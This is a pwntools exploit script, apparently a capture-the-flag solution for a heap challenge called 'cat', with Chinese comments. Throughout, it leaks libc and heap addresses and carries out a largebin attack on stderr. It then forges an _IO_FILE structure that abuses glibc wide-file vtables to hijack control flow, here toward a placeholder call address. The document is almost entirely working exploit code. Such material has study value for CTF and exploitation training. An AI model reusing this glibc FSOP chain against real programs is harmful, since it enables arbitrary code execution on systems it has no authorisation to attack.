from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwn")
def firstinit():
    payload=b"LOGIN | r00t QWB QWXFadmin"
    sh.sendafter(b'mew mew mew~~~~~~\n',payload)
def cmd(c):
    payload=b"CAT | r00t QWB QWXF$"+p32(0x0FFFFFFFF)
    sh.sendafter(b'mew mew mew~~~~~~\n',payload)
    sh.sendlineafter(b'plz input your cat choice:\n', str(c).encode())
def add(idx,size,ctt):
    cmd(1)
    sh.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())
    sh.sendlineafter(b"plz input your cat size:\n",str(size).encode()) #0x417<size<0x46f
    sh.sendlineafter(b"plz input your content:\n",ctt)
def dele(idx):
    cmd(2)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def show(idx):
    cmd(3)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def edit(idx,ctt):
    cmd(4)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
    sh.sendlineafter(b"plz input your content:\n", ctt)

firstinit()
#泄漏堆地址&libc地址
add(0,0x428,b'a')
add(1,0x420,b'b')
add(2,0x418,b'c')
add(3,0x420,b'd')
dele(0)
dele(2)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
sh.recv(2)
leak_heap=u64(sh.recv(8))
success("leak_heap:"+hex(leak_heap))
libcbase=leak_libc-0x219ce0
heapbase=(leak_heap>>12)<<12
success("libcbase:"+hex(libcbase))
success("heapbase:"+hex(heapbase))
#泄漏完毕
#largebin attack开始
libc=ELF("./libc.so.6")
largebin_fd=libcbase+0x21a0d0
chunk0_addr=heapbase+0x290
stderr=libcbase+libc.sym['stderr']
add(4,0x428,b'a') #4->0

call_addr=0xdeadbeef
fake_io_addr=heapbase+0xaf0 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE=p64(0)*4 #0x20
fake_IO_FILE +=p64(0)*2 #0x30
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP) #0x40
fake_IO_FILE +=p64(3)#_IO_backup_base=rdx #0x48
fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system) #0x50
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00') #0x58
fake_IO_FILE += p64(0)  # _chain #0x60
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00') #0x78
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address #0x80
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00') #0x90
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr #0x98
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00') #0xb0
fake_IO_FILE += p64(1) #mode=1 #0xb8
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00') #0xc8
fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10 #0xd0
fake_IO_FILE +=p64(0)*6 #0x100
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr 

add(5,0x418,fake_IO_FILE) #5->2
dele(4)
add(6,0x430,b'pad') #send chunk4 to largebin
edit(4,p64(largebin_fd)*2+p64(chunk0_addr)+p64(stderr-0x20)) #修改chunk4的bk_nextsize
dele(5)
add(7,0x430,b'pad2') #send chunk4 to largebin
#largebin attack结束
#触发stderr开始
add(8,0x450,b'a')
add(9,0x450,b'a')
dele(8)
dele(9)
add(10,0x440,b'a')
add(11,0x450,p64(0)+p64(0x451))
dele(9) 
edit(11,p64(0)+p64(0x111))
gdb.attach(sh,'b _IO_switch_to_wget_mode\nc')
cmd(1)
sh.sendlineafter(b"plz input your cat idx:\n",str(12).encode())
sh.sendlineafter(b"plz input your cat size:\n",str(0x460).encode())
#触发stderr结束
sh.interactive()